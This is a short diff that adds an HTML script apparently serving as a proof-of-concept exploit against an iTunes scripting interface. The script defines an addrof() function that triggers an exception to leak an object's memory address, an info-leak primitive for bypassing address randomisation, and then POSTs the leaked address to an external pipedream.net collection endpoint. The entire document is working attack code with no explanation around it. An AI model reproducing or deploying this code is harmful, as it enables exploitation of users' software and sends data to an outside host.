@@ -1,0 +1,20 @@
+<script>
+function addrof(obj) {
+	const saved = iTunes.scriptWindowContext();
+	iTunes.setScriptWindowContext_(obj);
+	try {
+		iTunes.window;
+	} catch(e) {
+		const match = /instance (0x[\da-f]+)$/i.exec(e);
+		if (match)
+			return match[1];
+		throw new Error('Unable to leak addr');
+	} finally {
+		iTunes.setScriptWindowContext_(saved);
+	}
+}
+
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "https://5381de4c031642a344fea58b89f511ba.m.pipedream.net", true);
+xhttp.send(addrof(iTunes.makeWindow()));	// WebScriptObject
+</script>
